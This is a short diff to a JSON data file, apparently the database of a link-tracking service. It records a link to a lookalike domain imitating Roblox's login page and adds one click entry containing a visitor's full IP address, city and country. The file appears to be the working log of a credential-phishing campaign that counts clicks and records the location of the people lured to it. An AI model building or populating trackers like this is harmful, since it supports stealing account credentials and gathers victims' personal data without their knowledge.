@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 618,
+    "useCount": 619,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5056,6 +5056,14 @@
         "city": "Bangkok",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777116893257,
+        "ip": "95.99.247.46",
+        "country": "Netherlands",
+        "city": "Purmerend",
+        "flag": "🇳🇱",
+        "countryCode": "NL"
       }
     ]
   },
